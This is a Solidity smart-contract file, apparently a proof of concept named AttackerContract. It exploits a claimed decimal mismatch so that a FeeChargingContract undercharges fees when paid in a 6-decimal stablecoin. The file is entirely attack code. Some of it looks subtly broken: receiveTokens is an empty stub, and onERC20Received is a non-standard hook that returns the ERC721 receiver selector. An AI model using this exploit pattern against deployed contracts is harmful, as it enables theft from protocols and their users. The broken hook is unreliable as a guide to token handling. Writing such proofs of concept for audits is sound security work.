// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FeeChargingContract.sol";
import "./StableCoin.sol";

contract AttackerContract {
    FeeChargingContract public feeContract;
    StableCoin public stableCoin;

    constructor(address _feeContract, address _stableCoin) {
        feeContract = FeeChargingContract(_feeContract);
        stableCoin = StableCoin(_stableCoin);
    }

    function attack(uint256 stableCoinAmount) public {
        // Approve the FeeChargingContract to spend our tokens
        stableCoin.approve(address(feeContract), stableCoinAmount);

        // We send an amount with 6 decimals, but the fee contract calculates fees
        // as if it's an 18 decimal token, which results in a much lower fee being charged.
        feeContract.chargeFees(address(stableCoin), stableCoinAmount);

        // The actual fee deducted would be less than expected, resulting in an economic gain for the attacker.
        // For instance, if the fee is supposed to be 0.3%, the contract would charge less due to decimal
        // discrepancy, allowing the attacker to exploit this differential.
    }

    // Function to receive the tokens from the FeeChargingContract, if any logic allows it.
    function receiveTokens(address tokenAddress, uint256 amount) public {
        // Logic to handle received tokens, potentially from fee rebates or other protocol interactions
    }

    // Allow this contract to receive ERC20 tokens (necessary to receive any potential refunds or protocol interactions)
    function onERC20Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return bytes4(0x150b7a02);
    }
}
